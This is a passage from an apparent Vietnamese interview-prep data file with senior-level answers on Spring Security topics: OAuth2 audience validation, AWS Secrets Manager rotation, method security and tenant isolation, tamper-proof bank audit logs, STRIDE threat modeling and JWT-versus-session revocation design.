  tags: ['JWT', 'Opaque Token', 'Token Revocation', 'Introspection', 'Refresh Token Rotation', 'Redis']
},
{
  id: 'security-018',
  topic: 'security',
  level: 'senior',
  q: 'Cấu hình OAuth2 Resource Server nâng cao: validate audience, nhiều issuer, map scope sang authority, JWKS rotation và xử lý lỗi 401 đúng chuẩn?',
  a: `**Tóm tắt:** Resource server **chỉ xác thực** token, không phát token. Ngoài chữ ký và {{exp}}, production bắt buộc kiểm tra **audience** (token cấp cho API khác không được dùng), map scope/role sang authority đúng, xử lý **nhiều issuer** nếu có nhiều auth server, và chịu được **JWKS rotation** cùng sự cố auth server. Lỗi phải trả 401 kèm header {{WWW-Authenticate}} đúng chuẩn.

### Validate bắt buộc
- Mặc định {{NimbusJwtDecoder}} kiểm tra chữ ký và timestamp ({{exp}}, {{nbf}} với clock skew 60 giây). {{iss}} chỉ được kiểm tra khi bạn cấu hình {{issuer-uri}} hoặc validator.
- **Audience** thường **không** được kiểm tra tự động. Đây là lỗ hổng hay bị bỏ sót: token của dịch vụ A vẫn dùng được ở dịch vụ B nếu cùng issuer và cùng key.
- Nên kiểm tra cả {{azp}}/{{client_id}} nếu token do nhiều client lấy.

~~~java
@Bean
JwtDecoder jwtDecoder(OAuth2ResourceServerProperties props) {
    NimbusJwtDecoder decoder = NimbusJwtDecoder
        .withJwkSetUri(props.getJwt().getJwkSetUri())
        .build();

    OAuth2TokenValidator<Jwt> withIssuer =
        JwtValidators.createDefaultWithIssuer("https://auth.bank.vn");
    OAuth2TokenValidator<Jwt> withAudience = new JwtClaimValidator<List<String>>(
        "aud", aud -> aud != null && aud.contains("payments-api"));

    decoder.setJwtValidator(new DelegatingOAuth2TokenValidator<>(withIssuer, withAudience));
    return decoder;
}
~~~

### Map scope và role
- Mặc định scope {{read:account}} thành authority {{SCOPE_read:account}}; dùng {{hasAuthority("SCOPE_read:account")}}.
- Token nội bộ thường có claim {{roles}} hoặc {{groups}}. Viết {{JwtAuthenticationConverter}} để gộp cả hai, thêm prefix {{ROLE_}} cho role để {{hasRole("ADMIN")}} hoạt động.
- Không map mù mọi giá trị {{groups}} thành authority nếu IdP cho phép user tự tạo group — phải whitelist.
- Phân biệt **scope** (quyền của client) và **role** (vai trò người dùng). API nên kiểm tra cả hai khi cần.

### Nhiều issuer
- Dùng {{JwtIssuerAuthenticationManagerResolver}} với map issuer → {{AuthenticationManager}}, chỉ nhận các issuer nằm trong **allowlist**. Tuyệt đối không lấy issuer từ token rồi gọi URL bất kỳ (nguy cơ SSRF).
- Với opaque token, cấu hình {{introspection-uri}} + client credentials; cache kết quả ngắn và không cache lỗi.

### JWKS rotation và độ sẵn sàng
- {{issuer-uri}} khiến app gọi {{/.well-known/openid-configuration}} lúc khởi động; auth server down có thể làm app không start. Với hệ thống cần khởi động độc lập, dùng thẳng {{jwk-set-uri}}.
- Decoder cache JWKS (mặc định khoảng 5 phút). Khi auth server xoay key, cần cửa sổ **overlap**: public key mới được publish trước, token cũ vẫn verify được bằng key cũ tới khi hết TTL.
- Đặt timeout ngắn cho việc tải JWKS và có retry; đừng để request treo theo auth server.

### 401 đúng chuẩn
- Trả {{401}} với {{WWW-Authenticate: Bearer error="invalid_token"}}; không trả 500, không trả stack trace.
- Không tiết lộ token hết hạn hay sai audience cho client không tin cậy; log chi tiết ở server với correlation id.
- Dispatch ERROR cũng cần authorize: Boot forward exception sang {{/error}} và từ chuỗi 6.x rule áp cho cả ERROR dispatch — nếu không permitAll cho {{/error}} (hoặc {{dispatcherTypeMatchers(DispatcherType.ERROR).permitAll()}}), lỗi gốc bị thay bằng 401/403, che mất dấu vết điều tra.

### Pitfall
- Chỉ cấu hình {{issuer-uri}} rồi tưởng đã đủ — thiếu audience check.
- Forward nguyên token người dùng xuống service nội bộ; nên dùng token exchange (RFC 8693) hoặc client credentials, và **không log** header {{Authorization}}.
- Đặt claim {{role}} từ client trong token mà không kiểm soát IdP.
- Dùng chung signing key cho mọi môi trường.

> Senior tip: viết bộ test cho decoder với 5 ca: token hợp lệ, hết hạn, sai audience, sai issuer, chữ ký sai. Kiểm tra thêm trường hợp JWKS trả 500 và assert app vẫn dùng cache. Trong ngân hàng, mỗi API nên có audience riêng và scope tối thiểu; rà soát định kỳ xem client nào đang xin scope thừa. Đừng bao giờ bật tính năng nhận token không chữ ký (alg none) — Nimbus mặc định từ chối, nhưng đừng tự viết decoder.`,
  follow: [
    'Vì sao chỉ kiểm tra issuer mà không kiểm tra audience lại nguy hiểm?',
    'JwtIssuerAuthenticationManagerResolver xử lý nhiều IdP thế nào và cần chặn rủi ro gì?',
    'Khi auth server down lúc khởi động, làm sao resource server vẫn start được?'
  ],
  tags: ['OAuth2 Resource Server', 'JWT Decoder', 'Audience', 'JWKS', 'Scope', 'JwtAuthenticationConverter']
},
{
  id: 'security-019',
  topic: 'security',
  level: 'senior',
  q: 'Quản lý secret production bằng AWS Secrets Manager: tích hợp Spring Boot, tự động rotation và bẫy cache credential cũ khiến app ngừng kết nối DB?',
  a: `**Tóm tắt:** Secret phải nằm trong kho tập trung có mã hoá, phân quyền và audit — **không** trong repo, image, biến môi trường hay file cấu hình. AWS Secrets Manager mã hoá bằng KMS, ghi CloudTrail mỗi lần đọc, và hỗ trợ **rotation tự động** (thường qua Lambda). Ứng dụng phải đọc secret qua SDK/IRSA, cache có TTL, và đặc biệt **xử lý đúng lúc credential đổi** — nếu không, connection pool giữ mật khẩu cũ và app chết sau rotation.

### Nguyên tắc nền
- **Secret zero**: app lấy quyền đọc secret bằng workload identity (IRSA trên EKS, instance profile trên EC2), không nhúng access key tĩnh.
- IAM least privilege: chỉ được {{secretsmanager:GetSecretValue}} đúng ARN, không {{ListSecrets}} toàn bộ.
- Bật encryption bằng CMK riêng cho môi trường; bật CloudTrail **data events** để biết ai đọc secret nào.
- Không đưa secret vào env var nếu tránh được: env lộ qua {{/proc}}, crash dump, child process, actuator/env. Ưu tiên đọc qua SDK hoặc CSI volume.

### Tích hợp Spring Boot
Spring Cloud AWS 3.x hỗ trợ import trực tiếp; các key trong JSON secret trở thành property:

~~~yaml
spring:
  config:
    import: aws-secretsmanager:prod/payments/db
  cloud:
    aws:
      region:
        static: ap-southeast-1
~~~

- Không dùng {{optional:}} cho secret bắt buộc — app phải fail-fast nếu không đọc được, thay vì chạy với cấu hình rỗng.
- Với ứng dụng không dùng Spring Cloud AWS, gọi {{GetSecretValueRequest}} lúc khởi tạo và map thủ công; đừng gọi API này trên mỗi request.
- Secret chứa nhiều key (username, password, host) thường là JSON; parse một lần rồi tạo {{DataSource}}.

### Rotation hoạt động thế nào
1. Lambda rotation được gắn vào secret, chạy theo lịch (ví dụ 30 ngày).
2. Với RDS, Lambda dùng **alternating users** ({{app_user}} và {{app_user_clone}}): tạo user mới/mật khẩu mới, cập nhật secret thành {{AWSPENDING}}, test kết nối, rồi chuyển {{AWSCURRENT}}.
3. Consumer đọc {{AWSCURRENT}}; secret có thêm {{AWSPREVIOUS}} trong thời gian chuyển tiếp để app còn đang giữ credential cũ vẫn hoạt động.
4. Kết thúc: credential cũ bị vô hiệu hoá. Cửa sổ chuyển tiếp chính là thời gian app phải refresh.

### Bẫy lớn nhất: connection pool giữ credential cũ
- HikariCP tạo connection với mật khẩu tại thời điểm tạo; connection sống lâu sẽ tiếp tục dùng session đã mở. Khi DB đổi mật khẩu, connection **mới** sẽ fail nếu app chưa đọc secret mới.
- Giải pháp: đọc lại secret theo lịch ngắn (vài phút) và đặt {{maxLifetime}} thấp hơn nhiều so với chu kỳ rủi ro (rotation 30 ngày, maxLifetime 20–30 phút là đủ dư). {{validationTimeout}} (mặc định 5 giây, kiểm tra lúc borrow connection) cứ để khoảng mặc định, đừng kéo dài.
- Khi refresh, tạo {{HikariDataSource}} mới và đóng cái cũ sau khi connection đang dùng xong; hoặc evict pool. Không chỉ gán lại biến password.
- Với RDS, cân nhắc **IAM database authentication**: token ngắn hạn (15 phút) sinh từ role, không cần password rotation — nhưng vẫn cần refresh token trước khi hết hạn.

### Các secret khác cần rotation
- JWT signing key: xoay theo {{kid}}, publish public key mới trước, giữ key cũ trong JWKS tới khi token cũ hết hạn.
- API key đối tác: hỗ trợ **hai key song song** trong thời gian đối tác chuyển đổi.
- Encryption key dữ liệu: envelope encryption, xoay DEK, giữ KEK cũ để giải mã dữ liệu cũ.

### Vận hành và sự cố
- Alert khi secret sắp quá hạn rotation hoặc rotation fail; theo dõi {{AWSCURRENT}} version age.
- Diễn tập rotation trên staging trước, đo thời gian app phục hồi.
- Không log giá trị secret, kể cả khi lỗi; che trong exception và actuator.
- Quét secret trong git bằng gitleaks/trufflehog, chặn ở pre-commit và CI.
- Multi-region: dùng replica secret, nhưng nhớ replica có thể trễ; không hard-code region.

> Senior tip: sự cố production điển hình không phải "không đọc được secret" mà là **rotation thành công nhưng app vẫn dùng mật khẩu cũ** vài giờ sau đó. Hãy coi rotation là một thay đổi hạ tầng có test: chạy rotation ở staging, theo dõi tỉ lệ lỗi đăng nhập DB, và có runbook rollback. Nếu dùng RDS IAM auth thì đơn giản hơn nhiều — không còn password để xoay, chỉ cần cấp token ngắn hạn.`,
  follow: [
    'Vì sao HikariCP vẫn lỗi sau khi Secrets Manager đã rotation thành công?',
    'RDS IAM database authentication thay thế password rotation như thế nào và có hạn chế gì?',
    'Làm sao xoay JWT signing key mà người dùng không bị đăng xuất hàng loạt?'
  ],
  tags: ['AWS Secrets Manager', 'Rotation', 'Spring Boot', 'HikariCP', 'KMS', 'IRSA', 'Secret Zero']
},
{
  id: 'security-020',
  topic: 'security',
  level: 'senior',
  q: 'Method security trong Spring Security 6: @PreAuthorize, AuthorizationManager và cách chặn leo thang quyền giữa các tenant khi service gọi nội bộ?',
  a: `**Tóm tắt:** URL rule chỉ bảo vệ request đi qua HTTP; **method security** bảo vệ tầng service, nơi mọi lời gọi nội bộ, scheduled job và message consumer đều đi qua. Spring Security 6 dùng {{@EnableMethodSecurity}} và **{{AuthorizationManager}}** thay cho {{AccessDecisionManager}} cũ. Nguyên tắc quan trọng: kiểm tra quyền **theo đối tượng và tenant**, không chỉ theo role, và không tin tham số {{tenantId}} do client gửi.

### @EnableMethodSecurity
- {{@EnableMethodSecurity}} bật {{@PreAuthorize}}, {{@PostAuthorize}}, {{@PreFilter}}, {{@PostFilter}}; mặc định {{prePostEnabled = true}}.
- Method security là **AOP proxy**: lời gọi từ bên ngoài bean mới bị chặn. Gọi {{this.method()}} trong cùng class sẽ **bỏ qua** kiểm tra. Đây là lỗi kinh điển.
- {{private}}, {{final}}, method trên class {{final}} không proxy được (CGLIB); đặt annotation ở public method của bean được inject.
- Có thể đặt ở controller hoặc service; nên đặt ở **service** vì đó là biên giới nghiệp vụ, controller có thể bị bỏ qua bởi consumer nội bộ.

### SpEL: mạnh nhưng dễ lạm dụng
~~~java
// So sánh cùng kiểu: tham số username (String) với authentication.name (String)
@PreAuthorize("hasRole('ADMIN') or #username == authentication.name")
public UserProfile getProfile(String username) { ... }
~~~
- SpEL gọi được bean ({{@authz.canRead(...)}}), tiện nhưng khó test và có thể gây N+1.
- Đừng nhét logic phức tạp vào SpEL; đóng gói thành bean rõ ràng, có test.
- {{@PostAuthorize}} kiểm tra **sau** khi method chạy, dùng khi quyền phụ thuộc kết quả trả về; exception vẫn rollback nếu trong transaction.
- {{@PostFilter}} vẫn load toàn bộ rồi mới lọc — dữ liệu lớn hãy lọc ở query.

### AuthorizationManager
- {{AuthorizationManager<T>}} có method {{check(Supplier<Authentication>, T)}} trả {{AuthorizationDecision}}. Nó thay thế {{AccessDecisionVoter}}/{{AccessDecisionManager}}.
- Có thể đăng ký interceptor cho method cụ thể hoặc dùng {{RequestMatcherDelegatingAuthorizationManager}} cho HTTP; ưu điểm là type-safe, unit test được và compose tốt.

~~~java
@Component("authz")
@RequiredArgsConstructor
public class AccountAuthorization {
    private final AccountRepository repo;

    public boolean canRead(Long accountId, Authentication auth) {
        if (auth == null || !auth.isAuthenticated()) return false;
        String tenant = auth.getAuthorities().stream()
            .filter(a -> a.getAuthority().startsWith("TENANT_"))
            .map(a -> a.getAuthority().substring(7)).findFirst().orElse(null);
        return tenant != null && repo.existsByIdAndTenantId(accountId, tenant);
    }
}

@PreAuthorize("@authz.canRead(#accountId, authentication)")
public AccountView getAccount(Long accountId) { ... }
~~~

### Cô lập tenant
- Tenant phải lấy từ token đã xác thực (claim {{tenant_id}}) và được đưa vào {{SecurityContext}}; không nhận từ header/body do client tự khai.
- Mọi query phải có điều kiện tenant, tốt nhất ở repository hoặc Hibernate filter; đừng chỉ kiểm tra ở controller.
- Với job nền/consumer, dựng {{Authentication}} có tenant trước khi gọi service; cache phải có tenant trong key, nếu không sẽ rò rỉ dữ liệu rất khó phát hiện.

### Async và reactive
- {{@Async}} mặc định **không** truyền {{SecurityContext}}. Dùng {{DelegatingSecurityContextExecutor}} hoặc bọc task bằng {{DelegatingSecurityContextRunnable}}; với WebFlux thì dựa vào context propagation của Reactor, không dùng thread-local.

### Test
- Dùng {{@WithMockUser}}, {{@WithUserDetails}} hoặc {{SecurityMockMvcRequestPostProcessors.jwt()}}.
- Test **âm tính** bắt buộc: tenant A gọi account của tenant B phải 403/404; thiếu role phải 403; và phải có ca phát hiện self-invocation.

> Senior tip: đừng coi {{@PreAuthorize}} là bùa hộ mệnh. Trong review, tôi luôn hỏi "nếu bỏ annotation này thì dữ liệu có còn được bảo vệ bởi query không?" — lớp phòng thủ tốt nhất là **query có tenant + ownership**, annotation chỉ là lớp thứ hai. Trả 404 thay vì 403 khi tài nguyên thuộc tenant khác để tránh dò ID. Và nhớ rằng method security không bảo vệ code chạy trong cùng bean nếu gọi qua {{this}}.`,
  follow: [
    'Vì sao @PreAuthorize bị bỏ qua khi gọi method nội bộ trong cùng bean?',
    'AuthorizationManager khác AccessDecisionManager cũ ở điểm nào?',
    'Làm sao truyền SecurityContext sang @Async và scheduled job an toàn?'
  ],
  tags: ['Spring Security 6', 'Method Security', 'AuthorizationManager', 'Multi-tenant', '@PreAuthorize', 'SecurityContext']
},
{
  id: 'security-021',
  topic: 'security',
  level: 'lead',
  q: 'Thiết kế audit log cho ngân hàng: đảm bảo đầy đủ, bất biến, chống sửa và tra soát được khi kiểm toán. Kiến trúc, lưu trữ và các điểm thất bại?',
  a: `**Tóm tắt:** Audit log là **bằng chứng pháp lý**, không phải app log. Nó phải trả lời ai làm gì, khi nào, từ đâu, trên đối tượng nào, kết quả ra sao — và phải **append-only, chống sửa, đủ dài để tra soát**. Kiến trúc thực tế: ghi cùng transaction qua **outbox**, lưu Postgres partition theo tháng, chuỗi hash + neo định kỳ vào **WORM storage** (S3 Object Lock), phân quyền tách biệt và có job kiểm tra toàn vẹn.

### Nội dung event
- **Actor**: user id, loại chủ thể (user/service/admin), tenant, phiên đăng nhập.
- **Hành động**: mã sự kiện có version ({{TRANSFER_APPROVE_V1}}), kênh (mobile, API, batch).
- **Đối tượng**: loại + id, **trước/sau** hoặc diff, hạn chế raw PII.
- **Bối cảnh**: thời gian UTC, trace id, IP, device id, kết quả (success/deny/error), lý do từ chối.
- **Toàn vẹn**: id tăng dần, hash bản ghi trước và hiện tại, chữ ký/neo theo lô.

### Ghi audit không được mất giao dịch
- **Outbox pattern**: trong cùng transaction nghiệp vụ, ghi event vào bảng {{audit_outbox}}; worker đọc và đẩy sang kho audit. Tránh dual-write (ghi DB rồi gọi Kafka) vì một trong hai có thể fail.
- Với sự kiện rủi ro cao (chuyển tiền, đổi quyền), nên **fail-closed**: không ghi được audit thì không cho giao dịch thành công. Sự kiện ít rủi ro hơn có thể buffer nhưng phải alert khi backlog tăng.
- Ghi **intent log** trước hành động nhạy cảm và ghi kết quả sau; nếu crash giữa chừng vẫn biết đã có ý định.

### Bất biến và chống sửa
- Bảng audit chỉ cấp quyền {{INSERT}} và {{SELECT}} cho app; **revoke UPDATE/DELETE**. Dùng role riêng, không dùng chung credential với app DB.
- Partition theo tháng, detach partition cũ sang storage lạnh.
- **Hash chain**: {{h_n = SHA-256(h_n-1 || canonical_json(event))}}. Sửa một bản ghi sẽ làm gãy toàn bộ chuỗi phía sau.
- **Neo (anchor)**: định kỳ ký số root hash và đẩy lên S3 Object Lock (compliance mode) hoặc dịch vụ notarize độc lập; kẻ có quyền DB vẫn không sửa được bản neo.
- Job định kỳ phát hiện gap về id, hash mismatch, bản ghi thiếu so với outbox; alert ngay, không tự "sửa" dữ liệu.

~~~sql
CREATE TABLE audit_event (
    seq          BIGSERIAL PRIMARY KEY,
    event_id     UUID NOT NULL UNIQUE,
    occurred_at  TIMESTAMPTZ NOT NULL,
    actor_id     TEXT,
    tenant_id    TEXT,
    action       TEXT NOT NULL,
    object_type  TEXT NOT NULL,
    object_id    TEXT,
    outcome      TEXT NOT NULL,
    payload      JSONB NOT NULL,
    prev_hash    BYTEA NOT NULL,
    hash         BYTEA NOT NULL
);
GRANT INSERT, SELECT ON audit_event TO app_role;   -- KHÔNG cấp UPDATE/DELETE cho role nào
REVOKE ALL ON audit_event FROM PUBLIC;             -- phòng khi PUBLIC từng được cấp quyền
~~~
- Postgres production: nghiệp vụ nên PARTITION BY RANGE theo occurred_at từng tháng; lưu ý trong bảng phân khoá, PK/unique phải gồm cả cột phân khoá, ví dụ PRIMARY KEY (occurred_at, seq).

### Lưu trữ, retention và PII
- Retention theo quy định nội bộ và NHNN; xác định thời hạn, legal hold và quy trình xoá. Với PII, che hoặc mã hoá số tài khoản, CCCD.
- Không ghi mật khẩu, token, CVV, full PAN; audit log cũng là mục tiêu tấn công nên phải mã hoá at-rest. Mọi truy cập vào audit phải được log lại (audit the auditors), dùng break-glass có phê duyệt.

### Tra soát và vận hành
- Index theo {{occurred_at}}, {{actor_id}}, {{object_id}}, {{trace_id}}; đồng bộ giờ bằng NTP/chrony và lưu UTC, vì lệch giờ làm bằng chứng mất giá trị.
- Dashboard cần có: backlog outbox, tỉ lệ verify fail, độ trễ tới kho audit; và diễn tập restore từ cold storage để verify hash chain.

### Điểm thất bại thường gặp
- Ghi audit bằng {{@Async}} rồi mất event khi pod bị kill — không có giao dịch bảo đảm.
- Chỉ lưu "thành công", bỏ qua lần bị từ chối — kiểm toán cần cả deny để phát hiện dò quyền.
- Retention ngắn hơn yêu cầu, hoặc xoá partition mà không kiểm tra legal hold.
- Hash chain nhưng root hash nằm cùng DB — kẻ sửa DB sửa được cả neo.

> Senior tip: câu hỏi kiểm toán khó nhất không phải "có log không" mà là **"chứng minh không ai sửa được log"**. Hash chain + WORM + tách quyền là bộ ba tối thiểu; hãy test bằng cách cố sửa một bản ghi trong môi trường staging và xem alert có nổ. Đừng biến audit thành nút thắt hiệu năng: outbox + partition giữ được throughput, còn fail-closed chỉ nên áp cho giao dịch tài chính và thay đổi quyền.`,
  follow: [
    'Vì sao không nên ghi audit trực tiếp vào Kafka trong cùng transaction nghiệp vụ?',
    'Hash chain phát hiện sửa đổi nhưng làm sao chứng minh không bị xoá cả một đoạn ở cuối?',
    'Retention nhiều năm xung đột với yêu cầu xoá dữ liệu cá nhân như thế nào?'
  ],
  tags: ['Audit Log', 'WORM', 'Hash Chain', 'Outbox', 'Banking', 'Compliance', 'PCI DSS', 'Immutable Storage']
},
{
  id: 'security-022',
  topic: 'security',
  level: 'lead',
  q: 'Threat modeling luồng chuyển tiền bằng STRIDE: vẽ trust boundary, liệt kê abuse case và biến thành security requirement/control cụ thể như thế nào?',
  a: `**Tóm tắt:** Threat modeling là hoạt động **thiết kế**, không phải tài liệu để đối phó audit. Với luồng chuyển tiền, ta vẽ luồng dữ liệu + **trust boundary**, soi từng thành phần bằng **STRIDE**, viết abuse case rồi chuyển thành security requirement có test. Giá trị nằm ở việc phát hiện sớm replay, double-spend, sửa số tiền và leo thang quyền — thứ scanner không tìm ra.

### 1. Xác định tài sản và phạm vi
- Tài sản: tiền, hạn mức, danh tính, thiết bị tin cậy, khoá ký, dữ liệu giao dịch.
- Actor gồm khách hàng, giao dịch viên, admin, đối tác, service nội bộ và **insider**.

### 2. Luồng dữ liệu và trust boundary
~~~text
[App mobile] --TLS--> [API Gateway/WAF] --mTLS/JWT--> [Payment service]
      |                                                      |
   (1) user session                                    (2) core banking (SOAP/REST)
                                                             |
                                                     (3) PostgreSQL ledger
                                                             |
                                                     (4) Kafka + audit WORM
~~~
Boundary gồm thiết bị ↔ Internet, DMZ ↔ nội bộ, service ↔ core banking, ứng dụng ↔ kho audit; mỗi boundary cần xác thực, mã hoá, rate limit và logging riêng.

### 3. STRIDE cho từng thành phần
| Mối đe doạ | Ví dụ trong chuyển tiền | Control điển hình |
|---|---|---|
| **Spoofing** | Giả mạo app, đánh cắp phiên, giả service nội bộ | MFA/step-up, device binding, mTLS, token ngắn hạn |
| **Tampering** | Sửa số tiền, số tài khoản nhận trong request | Server-side intent, ký request, kiểm tra lại hạn mức |
| **Repudiation** | Khách phủ nhận đã lệnh chuyển tiền | Audit log bất biến, OTP evidence, timestamp |
| **Information disclosure** | Lộ số dư, PII qua log/response lỗi | Mã hoá, masking, không trả stack trace |
| **Denial of service** | Bão request làm nghẽn payment | Rate limit, queue, circuit breaker, timeout |
| **Elevation of privilege** | IDOR sang tài khoản khác, mass assignment role | Ownership check, DTO allowlist, 4-eyes |

### 4. Abuse case cụ thể
- **Replay**: attacker bắt lại request chuyển tiền và gửi lại. Control: idempotency key + nonce + timestamp ngắn hạn, server lưu key đã dùng; request ký HMAC gồm cả nonce và số tiền.
- **Double-spend/race**: hai request đồng thời vượt hạn mức. Control: khoá lạc quan {{@Version}} hoặc bi quan trên tài khoản, ràng buộc số dư ở DB, ledger một chiều, đối soát cuối ngày.
- **Sửa số tiền phía client**: client gửi {{amount}} đã bị sửa. Control: tính lại từ intent đã lưu server-side; không tin bất kỳ con số nào từ client cho bước quyết toán.
- **Insider/4-eyes bypass**: một người vừa tạo vừa duyệt. Control: tách vai trò maker/checker ở DB + workflow, audit bất biến, giới hạn quyền DB trực tiếp.

### 5. Từ threat sang requirement có test
- Requirement: "Mọi lệnh chuyển tiền phải idempotent theo {{(customerId, idempotencyKey)}} trong 24 giờ." Test: gửi cùng key 2 lần, chỉ một bút toán.
- Requirement: "Số tiền cuối cùng lấy từ intent server-side, không từ payload." Test: sửa amount trong request, assert giao dịch dùng số đã lưu.
- Requirement: "Audit ghi cả lần từ chối kèm trace id, và khoá tài khoản có hiệu lực ≤ 30 giây." Test: force deny rồi đo thời gian từ lệnh khoá tới lần từ chối token.

### 6. Ưu tiên và theo dõi
- Chấm điểm theo khả năng xảy ra × tác động (tiền, pháp lý, uy tín); gắn owner, hạn xử lý và residual risk có chấp thuận. Threat model là tài liệu sống: cập nhật khi thêm kênh, đối tác hoặc luồng tiền; đo bằng số threat phát hiện sớm.

> Senior tip: đừng cố liệt kê mọi threat — hãy chọn **5 abuse case** tốn tiền nhất và biến chúng thành test tự động. Trong ngân hàng, một buổi threat model 90 phút trước khi code rẻ hơn nhiều so với việc vá sau khi lên production. Tôi luôn yêu cầu có mặt cả dev, BA, security và ops, vì threat hay nằm ở chỗ giao nhau giữa nghiệp vụ và hạ tầng — ví dụ quy trình hoàn tiền hoặc job đối soát mà không ai nghĩ tới.`,
  follow: [
    'Làm sao đảm bảo idempotency cho chuyển tiền mà không biến bảng idempotency thành điểm nghẽn?',
    'STRIDE có bỏ sót loại tấn công nào phổ biến trong ngân hàng (fraud, social engineering)?',
    'Làm sao đo hiệu quả của threat modeling thay vì chỉ đếm số tài liệu đã viết?'
  ],
  tags: ['Threat Modeling', 'STRIDE', 'Payment', 'Idempotency', 'Double Spending', 'Trust Boundary', 'Banking']
},
{
  id: 'security-023',
  topic: 'security',
  level: 'lead',
  q: 'Bạn thiết kế đăng nhập cho app ngân hàng có web và mobile. Chọn session lưu trên server hay JWT dựa trên tiêu chí "cửa sổ thu hồi" thế nào, và làm sao hỗ trợ "đăng xuất khỏi mọi thiết bị"?',
  a: `**Tóm tắt:** Câu hỏi đúng không phải "JWT hay session cái nào xịn hơn" mà là: **sau khi ra lệnh thu hồi (khoá tài khoản, đổi mật khẩu, đăng xuất), nghiệp vụ chấp nhận token cũ còn dùng được bao lâu?** Nếu chỉ vài giây, cần trạng thái phía server (session hoặc tra cứu mỗi request). Nếu chấp nhận 5–15 phút, dùng access token JWT ngắn hạn + refresh token xoay vòng lưu trong DB là đủ, và rẻ hơn khi có nhiều service.

### 1. "Cửa sổ thu hồi" là gì, đo thế nào
Cửa sổ thu hồi = khoảng thời gian từ lúc hệ thống quyết định "token này không còn hợp lệ" tới lúc **request cuối cùng** dùng token đó bị chặn.

~~~text
t0: admin khoá tài khoản ------------------------------> t1: request cuối cùng còn lọt
          |<-------------- cửa sổ thu hồi -------------->|

Session server-side : t1 - t0 ~ 0       (request kế tiếp tra store, session đã bị xoá)
JWT thuần, TTL 15'  : t1 - t0 <= 15 phút (service verify offline, không hỏi ai)
JWT + denylist      : t1 - t0 = độ trễ lan truyền denylist (vài ms nếu tra Redis trực tiếp,
                                 vài giây nếu mỗi service cache denylist cục bộ)
~~~
Hãy hỏi nghiệp vụ một con số cụ thể. Ví dụ ngân hàng thường yêu cầu: "khách báo mất điện thoại, khoá xong thì **trong 5 giây** không giao dịch được nữa". Một trang đọc tin tức có thể chấp nhận 1 giờ.

### 2. Ba kiến trúc và chi phí
**(a) Session lưu trạng thái** (Spring Session + Redis): trình duyệt giữ cookie {{SESSION}} (HttpOnly, Secure, SameSite), mỗi request service đọc session từ Redis.
- Thu hồi: xoá key trong Redis, hiệu lực ngay.
- Chi phí: 1 lần đọc Redis mỗi request (thường dưới 1 ms cùng AZ). 5.000 req/s là 5.000 ops/s, một node Redis chịu thoải mái. Rủi ro thật là **Redis thành điểm phụ thuộc**: Redis chết thì mọi người bị đăng xuất hoặc không đăng nhập được, nên cần replica/failover và không để eviction xoá session (đặt {{maxmemory-policy noeviction}} cho cluster session).

**(b) JWT ngắn hạn + refresh token xoay vòng**: access token 5–10 phút, verify offline bằng public key (cỡ vài chục micro giây, không gọi mạng). Refresh token là chuỗi ngẫu nhiên lưu **hash** trong DB.
- Rotation: mỗi lần refresh, token cũ bị đánh dấu đã dùng, phát token mới cùng {{family_id}}.
- **Reuse detection**: nếu một refresh token **đã dùng** lại được gửi lên, nghĩa là có hai bên cùng giữ nó (một bên là kẻ trộm), nên thu hồi **cả family**. Đây là khuyến nghị trong OAuth 2.0 Security BCP (RFC 9700).
- Cửa sổ thu hồi = TTL access token. Chi phí: chỉ đọc DB lúc refresh (vài phút/lần/thiết bị), không phải mỗi request.

**(c) JWT + denylist {{jti}} trong Redis**: thu hẹp cửa sổ xuống gần 0, nhưng mỗi request lại tra Redis, tức là bạn đã quay về **stateful** mà vẫn gánh độ phức tạp của JWT (key rotation, kích thước token). Chỉ đáng khi đã có hạ tầng JWT cho nhiều service và chỉ một số API cần thu hồi tức thì.

| Tiêu chí | Session + Redis | JWT ngắn + refresh rotation | JWT + denylist |
|---|---|---|---|
| Cửa sổ thu hồi | ~0 | = TTL access (5–15') | ~0 đến vài giây |
| Tra cứu mỗi request | Có | Không | Có |
| Hợp với nhiều microservice | Kém (mọi service phải đọc store) | Tốt | Trung bình |
| Độ phức tạp | Thấp | Trung bình | Cao |

### 3. Đăng xuất khỏi mọi thiết bị
- **Session**: cần tìm mọi session theo user. Spring Session cung cấp {{FindByIndexNameSessionRepository.findByPrincipalName(username)}}; với Redis phải dùng repository loại **indexed** (Spring Boot 3: {{spring.session.redis.repository-type=indexed}}), loại mặc định không có index này. Lấy danh sách rồi {{deleteById}} từng session.
- **JWT**: thu hồi mọi refresh token family của user ({{UPDATE refresh_token SET revoked = true WHERE user_id = ?}}). Access token đang lưu hành vẫn sống tới hết TTL. Nếu cửa sổ đó không chấp nhận được, thêm claim {{ver}} (token version của user), tăng version khi "đăng xuất tất cả", và các API nhạy cảm (chuyển tiền) so sánh với version trong cache.

~~~java
// Refresh với rotation + reuse detection (rút gọn)
@Transactional
public Tokens refresh(String presented) {
    RefreshToken rt = repo.findByHash(sha256(presented))       // chỉ lưu hash, lộ DB không lộ token
        .orElseThrow(InvalidTokenException::new);
    if (rt.isRevoked() || rt.isExpired()) throw new InvalidTokenException();
    if (rt.getUsedAt() != null) {                              // token đã dùng mà bị gửi lại
        repo.revokeFamily(rt.getFamilyId());                   // => nghi bị đánh cắp, khoá cả họ
        throw new InvalidTokenException();
    }
    rt.setUsedAt(Instant.now());
    String next = randomToken();                               // 32 byte SecureRandom
    repo.save(RefreshToken.child(rt, sha256(next)));           // cùng family_id, cùng user, thiết bị
    return new Tokens(jwt.issue(rt.getUserId(), Duration.ofMinutes(10)), next);
}
~~~

### 4. Pitfall production
- **Refresh đồng thời**: app mobile mở hai luồng cùng refresh một token, luồng thứ hai bị coi là "reuse" và cả family bị khoá, người dùng bị đăng xuất vô cớ. Cách xử lý thường dùng: grace period vài giây trả lại đúng token con vừa phát, hoặc client serialize việc refresh.
- Lưu refresh token dạng plaintext trong DB: lộ backup là lộ phiên của mọi người.
- Session cookie thiếu {{HttpOnly}}/{{Secure}}, hoặc không đổi session id sau login (session fixation; Spring Security mặc định đã đổi id, đừng tắt).
- Đặt TTL access 24 giờ "cho đỡ refresh" rồi tuyên bố "có logout": logout chỉ xoá token ở client, token bị trộm vẫn dùng được cả ngày.

> Senior tip: ghi rõ cửa sổ thu hồi vào tài liệu kiến trúc như một NFR có số ("khoá tài khoản có hiệu lực ≤ 5 giây với API chuyển tiền, ≤ 10 phút với API đọc"). Thiết kế lai rất phổ biến: web dùng session cookie qua BFF, mobile dùng access 10 phút + refresh rotation, và riêng API giao dịch kiểm tra thêm token version. Đừng bắt mọi API trả giá tra cứu chỉ vì vài API cần thu hồi tức thì.`,
  follow: [
